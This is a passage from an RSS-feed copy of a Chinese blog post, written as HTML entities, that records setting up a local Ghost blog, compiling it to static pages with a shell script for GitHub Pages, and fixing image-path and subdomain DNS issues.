&#x4ECD;&#x5728;&#x7A33;&#x5B9A;&#x8FD0;&#x884C;&#xFF0C;&#x7531;&#x4E8E;&#x79D1;&#x5B66;&#x4E0A;&#x7F51;&#x7684;&#x539F;&#x56E0;&#xFF0C;&#x53EF;&#x80FD;&#x5B58;&#x5728;&#x8BBF;&#x95EE;&#x4E0A;&#x7684;&#x75DB;&#x70B9;&#x3002;&#x8003;&#x8651;&#x5230;&#x4E91;&#x670D;&#x52A1;&#x5668;&#x5F80;&#x540E;&#x8FC1;&#x79FB;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x6545;&#x8BB0;&#x5F55;&#x5907;&#x4EFD;&#x4E0E;&#x914D;&#x7F6E;&#x7684;&#x8FC7;&#x7A0B;&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B">&#x5FEB;&#x901F;&#x4E0A;&#x624B;</h2>
<h3 id="ghost">Ghost</h3>
<p>&#x867D;&#x5728;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x642D;&#x5EFA;&#x51FA;&#x6765;&#x7684; Ghost &#x5C5E;&#x4E8E;&#x52A8;&#x6001;&#x535A;&#x5BA2;&#xFF0C;&#x4F46;&#x4E5F;&#x53EF;&#x901A;&#x8FC7;&#x7F16;&#x8BD1;&#x914D;&#x7F6E;&#x751F;&#x6210; Hexo&#x3001;Jekyll &#x8FD9;&#x7C7B;&#x9759;&#x6001;&#x535A;&#x5BA2;&#x9875;&#x9762;&#x3002;Wordpress &#x76F8;&#x8F83;&#x4E8E;&#x5E76;&#x53D1;&#x80FD;&#x529B;&#x66F4;&#x5F3A;&#x7684; Ghost &#x8FD8;&#x662F;&#x7A0D;&#x900A;&#x98CE;&#x9A9A;&#x3002;</p>
<h3 id="%E9%85%8D%E7%BD%AE%E8%BF%87%E7%A8%8B">&#x914D;&#x7F6E;&#x8FC7;&#x7A0B;</h3>
<ul>
<li>&#x7248;&#x672C;&#x4F9D;&#x8D56;</li>
</ul>
<pre><code class="language-java">MacM1: BigSur 11.4
Ghost-CLI version: 1.17.3
Node -v: v14.17.1
Ghost Local: 4.8.4

Ubuntu: version:18.04
Nginx: version:1.14.0
MySQL: version:5.7.27
Node.js: version:10.24.0
Ghost-CLI: version: 1.16.0
Ghost: version:3.0.2
</code></pre>
<ul>
<li>&#x5B89;&#x88C5; Ghost-CLI</li>
</ul>
<pre><code class="language-shell">sudo npm install -g ghost-cli@latest
</code></pre>
<ul>
<li>&#x5728;&#x81EA;&#x5B9A;&#x4E49;&#x7A7A;&#x6587;&#x4EF6;&#x5939;&#x5B89;&#x88C5; Ghost</li>
</ul>
<pre><code class="language-shell">$ ghost install local
&#x2714; Checking system Node.js version - found v14.17.1
&#x2714; Checking current folder permissions
...
&#x2714; Starting Ghost
...
yourdomain.com/ghost/
</code></pre>
<p>&#x540E;&#x7EED;&#x7684; <code>ghost start|stop</code> &#x987B;&#x5728;&#x8BE5;&#x5B89;&#x88C5; Ghost &#x7684;&#x6587;&#x4EF6;&#x5939;&#x76EE;&#x5F55;&#x4E0B;&#x6267;&#x884C;&#xFF0C;&#x5426;&#x5219;&#x4F1A;&#x51FA;&#x73B0; <code>Working directory is not a recognisable Ghost installation.</code> &#x7684;&#x9519;&#x8BEF;&#x3002;</p>
<h3 id="%E7%BC%96%E8%AF%91%E9%9D%99%E6%80%81%E9%A1%B5%E9%9D%A2">&#x7F16;&#x8BD1;&#x9759;&#x6001;&#x9875;&#x9762;</h3>
<ul>
<li><a href="https://github.com/Zairesinatra/myShare/blob/main/gui.sh">&#x70B9;&#x6B64;&#x4E0B;&#x8F7D;shellScript</a>&#xFF0C;&#x7528;&#x4E8E;&#x5C06; Local Ghost &#x7F16;&#x8BD1;&#x6210;&#x9759;&#x6001;&#x9875;&#x9762;</li>
<li>&#x4E0B;&#x8F7D;&#x5B8C;&#x6BD5;&#x540E;&#x5C06; gui.sh &#x6587;&#x4EF6;&#x4FDD;&#x5B58;&#x5728;&#x672C;&#x5730; Ghost &#x7F51;&#x7AD9;&#x7684;&#x6839;&#x76EE;&#x5F55;&#x4E2D;</li>
<li>&#x4FEE;&#x6539;&#x8BE5;&#x6587;&#x4EF6;&#x4E2D; <code># Define urls and https</code> &#x90E8;&#x5206;</li>
</ul>
<pre><code class="language-shell"># Define urls and https
from_url=yourdomain.com # change this if your local ghost url is different
to_url=yourdomain.com # change it to your real domain name (no add https)
to_https=true # set true to enable HTTPS (e.g. GitHub Pages)
</code></pre>
<ul>
<li>&#x589E;&#x52A0; shellScript &#x6743;&#x9650;</li>
</ul>
<pre><code class="language-shell">chmod +x gui.sh
</code></pre>
<ul>
<li>&#x8FD0;&#x884C;&#x811A;&#x672C;&#xFF0C;&#x751F;&#x6210;&#x9759;&#x6001;&#x6587;&#x4EF6;&#x76EE;&#x5F55;</li>
</ul>
<pre><code class="language-shell">./gui.sh or source gui.sh or sh gui.sh
</code></pre>
<ul>
<li>&#x5C06; static &#x76EE;&#x5F55;&#x4E0A;&#x4F20; Github Page &#x5373;&#x53EF;</li>
</ul>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="prismjs">Prism.js</h2>
<p><a href="http://k88hudson.github.io/syntax-highlighting-theme-generator/www/">&#x8BED;&#x6CD5;&#x9AD8;&#x4EAE;&#x4E3B;&#x9898;&#x751F;&#x6210;&#x5668;</a></p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="bugs-%E8%A7%A3%E5%86%B3">Bugs &#x89E3;&#x51B3;</h2>
<ul>
<li>&#x7531;&#x4E8E; src &#x7684;&#x8DEF;&#x5F84;&#x540E;&#x7F00;&#x9519;&#x8BEF;&#x800C;&#x5BFC;&#x81F4;&#x63D2;&#x56FE;&#x663E;&#x793A;&#x5931;&#x8D25;</li>
</ul>
<p><img src="yourdomain.com/content/images/2022/05/blogsrcerror.png" alt="&#x1F977;&#x1F3FB;Ghost&amp;Github Config" loading="lazy"></p>
<p>&#x56E0;&#x9ED8;&#x8BA4;&#x81EA;&#x52A8;&#x7F16;&#x8BD1;&#x751F;&#x6210;&#x7684;&#x662F;&#x52A8;&#x6001;&#x7F51;&#x7AD9;&#xFF0C;&#x800C;&#x5B9E;&#x9645;&#x9700;&#x7F16;&#x8BD1;&#x6210;&#x9759;&#x6001;&#x7F51;&#x7AD9;&#x65F6;&#xFF0C;&#x5E94;&#x5F53;&#x4FEE;&#x6539;&#x9ED8;&#x8BA4;&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x76F8;&#x5173;&#x914D;&#x7F6E;&#x3002;&#x5C06;<strong>&#x6240;&#x6709;&#x7684; <code>.hbs</code> &#x6587;&#x4EF6;</strong>&#x4E2D;&#x7684;&#x683C;&#x5F0F;&#x9009;&#x578B;&#x4EE3;&#x7801;&#x8FDB;&#x884C;&#x6307;&#x5B9A;&#x5220;&#x51CF;&#x3002;</p>
<pre><code class="language-html">{{#if feature_image}}
  &lt;figure class=&quot;article-image&quot;&gt;
    {{!-- This is a responsive image, it loads different sizes depending on device
    https://medium.freecodecamp.org/a-guide-to-responsive-images-with-ready-to-use-templates-c400bd65c433 --}}
    &lt;img
      srcset=&quot;{{img_url feature_image size=&quot;xl&quot;}} 2000w&quot;
      sizes=&quot;(min-width: 1400px) 1400px, 92vw&quot;
      src=&quot;{{img_url feature_image size=&quot;xl&quot;}}&quot;
      alt=&quot;{{title}}&quot;
    /&gt;
  &lt;/figure&gt;
{{/if}}
</code></pre>
<ul>
<li>&#x5B50;&#x57DF;&#x540D;&#x5728;&#x5230;&#x671F;&#x540E;&#x7EED;&#x8D39;&#xFF0C;&#x63D0;&#x793A;&#x9700;&#x8981;&#x57DF;&#x540D;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;</li>
</ul>
<p>&#x7531;&#x4E8E;&#x8FD9;&#x4E2A;&#x5B50;&#x57DF;&#x540D;&#x4ECE;&#x5C5E;&#x662F;&#x4F4D;&#x4E8E;&#x53E6;&#x5916;&#x7684;&#x8D26;&#x6237;&#xFF0C;&#x90A3;&#x4E48;&#x5728;&#x8FDB;&#x884C; DNS &#x57DF;&#x540D;&#x89E3;&#x6790;&#x65F6;&#x5E94;&#x8BE5;&#x5728;&#x4E00;&#x7EA7;&#x57DF;&#x540D;&#x6240;&#x5728;&#x8D26;&#x6237;&#x4E2D;&#x6DFB;&#x52A0;&#x89E3;&#x6790;&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E7%BB%93%E6%9D%9F">&#x7ED3;&#x675F;</h2>
<p>&#x672C;&#x535A;&#x5BA2;&#x6240;&#x6709;&#x6587;&#x7AE0;&#x9664;&#x7279;&#x522B;&#x58F0;&#x660E;&#x5916;&#xFF0C;&#x5747;&#x91C7;&#x7528;<a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh"> CC BY-SA 4.0 &#x534F;&#x8BAE; </a>&#xFF0C;&#x8F6C;&#x8F7D;&#x8BF7;&#x6CE8;&#x660E;&#x51FA;&#x5904;&#xFF01;</p>
<!--kg-card-end: markdown-->]]></content:encoded></item></channel></rss>